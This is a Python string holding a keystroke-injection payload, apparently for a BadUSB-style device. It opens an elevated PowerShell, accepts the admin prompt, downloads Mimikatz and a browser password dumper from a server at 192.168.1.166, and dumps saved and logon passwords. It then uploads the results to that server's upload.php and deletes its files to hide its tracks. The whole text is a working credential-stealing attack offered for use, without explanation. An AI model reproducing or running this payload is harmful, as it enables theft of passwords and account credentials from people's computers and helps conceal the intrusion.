data = """\RUNBOX
\SLEEP 0.1
powershell.exe
\SLEEP 0.1
\ADMINPRESS
\SLEEP 0.1
\ALT
Y
\SLEEP 0.1
$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://192.168.1.166:8000/webpass.exe','C:/webpass.exe'); $WebClient.DownloadFile('http://192.168.1.166:8000/mimikatz64.exe','C:/mim64.exe'); $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://192.168.1.166:8000/mimikatz32.exe','C:/mim32.exe'); C:/webpass.exe /stext C:/pass.txt ; C:/mim64.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' > C:/64.txt ; C:/mim32.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit' > C:/32.txt ; start-sleep -s 0.8 ;  Invoke-RestMethod -Uri "http://192.168.1.166:8000/upload.php" -method POST -infile C:/pass.txt ; start-sleep -s 0.8 ; Invoke-RestMethod -Uri "http://192.168.1.166:8000/upload.php" -method POST -infile "C:/64.txt" ; start-sleep -s 0.8; Invoke-RestMethod -Uri "http://192.168.1.166:8000/upload.php" -method POST -infile "C:/32.txt" ; rm C:/webpass.exe; rm C:/pass.txt ; rm C:/mim64.exe ; rm C:/mim32.exe; rm C:/64.txt; rm C:/32.txt; exit
\ENTER"""

